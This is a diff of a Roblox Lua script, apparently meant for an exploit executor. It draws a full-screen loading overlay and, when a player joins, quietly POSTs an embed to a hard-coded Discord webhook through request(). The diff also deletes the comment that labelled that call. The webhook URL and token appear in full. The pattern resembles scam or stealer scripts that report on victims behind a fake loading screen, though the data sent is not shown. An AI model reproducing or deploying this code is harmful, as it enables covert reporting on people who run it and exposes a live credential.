@@ -4,7 +4,7 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local placeId = 126884695634066
 
-local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y" -- Change this!
+local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y"
 
 local loadingScript = [[
 local Players = game:GetService("Players")
@@ -63,7 +63,6 @@ fill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
 fill.BorderSizePixel = 0
 fill.ZIndex = 1000001
 
--- Send Webhook on Join
 local success, err = pcall(function()
     local data = {
         ["content"] = "",
@@ -77,11 +76,15 @@ local success, err = pcall(function()
             ["color"] = 0x00FFFF
         }}
     }
-    HttpService:PostAsync(
-        "]] .. webhookUrl .. [[",
-        HttpService:JSONEncode(data),
-        Enum.HttpContentType.ApplicationJson
-    )
+
+    request({
+        Url = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(data)
+    })
 end)
 
 task.spawn(function()
